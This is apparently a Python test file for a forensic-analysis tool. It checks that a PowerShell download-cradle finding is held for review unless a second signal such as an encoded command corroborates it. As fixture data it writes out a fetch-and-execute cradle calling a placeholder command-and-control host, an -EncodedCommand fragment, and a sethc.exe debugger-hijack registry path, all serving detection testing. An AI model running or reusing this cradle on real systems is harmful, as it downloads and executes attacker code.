"""The C2_REQUIRES_CORROBORATION gate: a download-cradle finding to a non-vendor
domain confirms ONLY when >= 2 independent structural axes converge -- else it is
held out of confirmed (-> needs-review). Universal: cradle/obfuscation/injection/
DGA are fact SHAPES; the domain here is a generic placeholder, never a case value.
"""
from sift_sentinel.analysis.disposition import (
    evaluate_confirmed_bucket_eligibility, _c2_uncorroborated,
    GATE_C2_REQUIRES_CORROBORATION,
)

_CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://h.bad-c2.net/a.ps1')"


def _finding(cmd):
    return {
        "finding_id": "Fc2", "title": "ps download cradle",
        "severity": "HIGH", "confidence_level": "HIGH",
        "source_tools": ["parse_powershell_transcripts"], "tool_call_ids": ["t1"],
        "raw_excerpt": cmd,
        "claims": [{"type": "powershell_command_fact", "command": cmd,
                    "fact_id": "pf1", "value": cmd}],
    }


def test_cradle_alone_fails_the_gate():
    elig = evaluate_confirmed_bucket_eligibility(_finding(_CRADLE))
    assert elig["gates"][GATE_C2_REQUIRES_CORROBORATION] == "FAIL"


def test_cradle_plus_obfuscation_passes_the_gate():
    # second independent axis: an encoded command on the same host
    elig = evaluate_confirmed_bucket_eligibility(
        _finding(_CRADLE + " ; powershell -EncodedCommand QQBBAEEA"))
    assert elig["gates"][GATE_C2_REQUIRES_CORROBORATION] == "PASS"


def test_non_c2_finding_is_untouched():
    # an IFEO finding (no c2/dga signal) must never trip the C2 gate
    f = {"finding_id": "Fifeo", "title": "ifeo debugger hijack",
         "severity": "HIGH", "confidence_level": "HIGH",
         "source_tools": ["vol_registry"], "tool_call_ids": ["t2"],
         "raw_excerpt": "Image File Execution Options sethc.exe Debugger",
         "claims": [{"type": "registry_persistence_fact", "fact_id": "r1",
                     "value": "HKLM\\...\\Image File Execution Options\\sethc.exe\\Debugger"}]}
    elig = evaluate_confirmed_bucket_eligibility(f)
    assert elig["gates"][GATE_C2_REQUIRES_CORROBORATION] == "PASS"


def test_helper_unit():
    assert _c2_uncorroborated({"claims": []}, True, ["c2_staging_domain"]) is True
    assert _c2_uncorroborated({"claims": []}, True,
                              ["c2_staging_domain", "dga_domain"]) is False  # 2 axes
    assert _c2_uncorroborated({}, True, ["ifeo_debugger_hijack"]) is False   # not c2
    assert _c2_uncorroborated({}, False, ["c2_staging_domain"]) is False     # no sem
